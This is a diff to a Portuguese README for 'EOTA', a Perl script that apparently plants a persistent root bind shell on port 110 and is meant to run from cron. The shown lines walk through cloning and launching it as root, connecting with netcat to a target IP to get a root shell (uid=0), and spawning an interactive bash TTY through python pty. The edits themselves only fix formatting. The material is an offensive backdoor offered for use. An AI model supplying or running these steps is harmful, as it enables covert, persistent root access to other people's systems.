@@ -21,9 +21,9 @@ EOTA foi projetado para ser utilizado com um arquivo CRON, seu banner exibe as c
 Para executar EOTA voce precisará de acesso root ao sistema, depois execute os seguintes comandos:
 
 >$ git clone https://github.com/Outs1d3r-Net/PERL.git<br/>
->$ cd PERL
->$ chmod a+x EOTA.pl
-># perl ./EOTA.pl 110 & 2>&1
+>$ cd PERL<br/>
+>$ chmod a+x EOTA.pl<br/>
+>'#' perl ./EOTA.pl 110 & 2>&1
 
 ## CONECTANDO
 >$ nc IP_alvo 110<br/>
@@ -32,7 +32,7 @@ Para executar EOTA voce precisará de acesso root ao sistema, depois execute os 
 >uid=0(root) gid=0(root) groups=0(root)
 
 ## TTY
-Se voce precisar de um TTY voce verificar com o python por exemplo para obter uma linha de comando mais interativa:<br/>
+Se voce precisar de um TTY voce pode verificar com o python por exemplo, para obter uma linha de comando mais interativa:<br/>
 >which python<br/>
 >/usr/bin/python2 -c 'import pty;pty.spawn("/bin/bash")'<br/>
 
